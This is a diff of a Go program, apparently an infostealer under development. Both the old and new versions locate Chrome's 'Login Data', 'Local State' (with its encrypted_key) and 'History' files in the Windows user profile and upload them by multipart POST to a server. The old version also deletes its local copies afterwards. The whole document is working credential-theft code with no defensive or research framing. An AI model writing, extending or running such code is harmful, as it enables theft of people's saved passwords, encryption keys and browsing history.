@@ -2,85 +2,49 @@ package main
 
 import (
 	"bytes"
-	"flag"
 	"fmt"
 	"io"
-	"io/ioutil"
 	"log"
 	"mime/multipart"
 	"net/http"
 	"os"
 	"os/user"
 	"path/filepath"
-	"regexp"
 	"sync"
-
-	_ "github.com/mattn/go-sqlite3"
 )
 
-var port int
-var address string
-
-var ghais int
-
-func check(err error) {
+func findFiles(path string, filenames []string) ([]*os.File, error) {
+	files := []*os.File{}
+	err := filepath.Walk(path, func(currentPath string, info os.FileInfo, err error) error {
+		if err != nil {
+			return err
+		}
+		for _, filename := range filenames {
+			if info.Name() == filename {
+				file, err := os.Open(currentPath)
+				if err != nil {
+					return err
+				}
+				files = append(files, file)
+			}
+		}
+		return nil
+	})
 	if err != nil {
-		fmt.Printf("Error : %s", err.Error())
-		os.Exit(1)
+		return nil, err
 	}
+	return files, nil
 }
 
-func getEncryptedKey() string {
-	usr, _ := user.Current()
-	keyPath := filepath.Join(usr.HomeDir, "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
-	srcFile, err := os.Open(keyPath)
-	check(err)
-	defer srcFile.Close()
-
-	destFile, err := os.Create("local_state.json")
-	_, err = io.Copy(destFile, srcFile)
-	check(err)
-	destFile.Close()
-
-	data, err := ioutil.ReadFile("local_state.json")
-	if err != nil {
-		log.Fatal(err)
-	}
-
-	r := regexp.MustCompile(`"encrypted_key"\s*:\s*"([^"]*)"`)
-	matches := r.FindStringSubmatch(string(data))
-
-	if len(matches) < 2 {
-		log.Fatal("No encrypted_key found in the file")
-	}
-
-	return matches[1]
-}
-
-func saveStringToFile(str string) {
-	f, err := os.Create("./encryption_key")
-	check(err)
-
-	defer f.Close()
-
-	_, err = f.WriteString(str)
-	check(err)
-}
-
-func sendFile(filename string, wg *sync.WaitGroup) {
+func sendFile(browser string, file *os.File, wg *sync.WaitGroup) {
 	defer wg.Done()
 
-	file, err := os.Open(filename)
-	if err != nil {
-		log.Fatalf("Error opening file: %v", err)
-	}
-	defer file.Close()
-
 	var requestBody bytes.Buffer
+	fullName := getFullName(file.Name(), browser)
 
 	multiPartWriter := multipart.NewWriter(&requestBody)
 
-	fileWriter, err := multiPartWriter.CreateFormFile("file", filepath.Base(file.Name()))
+	fileWriter, err := multiPartWriter.CreateFormFile("file", fullName)
 	if err != nil {
 		log.Fatalf("Error adding file to request: %v", err)
 	}
@@ -92,7 +56,7 @@ func sendFile(filename string, wg *sync.WaitGroup) {
 
 	multiPartWriter.Close()
 
-	req, err := http.NewRequest(http.MethodPost, fmt.Sprintf("http://%s:%v/upload", address, port), &requestBody)
+	req, err := http.NewRequest(http.MethodPost, "http://localhost:8080/upload", &requestBody)
 	if err != nil {
 		log.Fatalf("Error creating request: %v", err)
 	}
@@ -115,44 +79,30 @@ func sendFile(filename string, wg *sync.WaitGroup) {
 
 }
 
+func getFullName(path string, browser string) string {
+	dirPath := filepath.Dir(path)
+	parentFolderName := filepath.Base(dirPath)
+	fileName := filepath.Base(path)
+
+	fullName := parentFolderName + "_" + fileName + "_" + browser
+	return fullName
+}
+
 func main() {
-	flag.IntVar(&port, "p", 8080, "Provide a port number")
-	flag.StringVar(&address, "a", "localhost", "Provide an ip address")
-	flag.Parse()
-
+	filenames := []string{"Local State", "Login Data", "History"}
 	usr, _ := user.Current()
-	dbPath := filepath.Join(usr.HomeDir, "AppData", "Local", "Google", "Chrome", "User Data", "Profile 1", "Login Data")
-	srcFile, err := os.Open(dbPath)
-	check(err)
-	defer srcFile.Close()
+	rootPath := filepath.Join(usr.HomeDir, "AppData", "Local", "Google", "Chrome", "User Data")
+	filePointers, err := findFiles(rootPath, filenames)
+	if err != nil {
+		log.Fatalf("Error searching for files: %v", err)
+	}
 
-	destFile, err := os.Create("login_data")
-	check(err)
-
-	_, err = io.Copy(destFile, srcFile)
-	check(err)
-	destFile.Close()
-
-	encryptedKey := getEncryptedKey()
-	saveStringToFile(encryptedKey)
-
-	fmt.Println("Script started")
 	var wg sync.WaitGroup
 
-	filenames := []string{"local_state.json", "login_data", "encryption_key"}
-	for _, filename := range filenames {
+	for _, file := range filePointers {
 		wg.Add(1)
-		go sendFile(filename, &wg)
+		go sendFile("chrome", file, &wg)
 	}
 
 	wg.Wait()
-
-	for _, filename := range filenames {
-		err := os.Remove(filename)
-		if err != nil {
-			log.Fatalf("Error deleting file: %v", err)
-		}
-
-		fmt.Printf("Deleted file: %s\n", filename)
-	}
 }
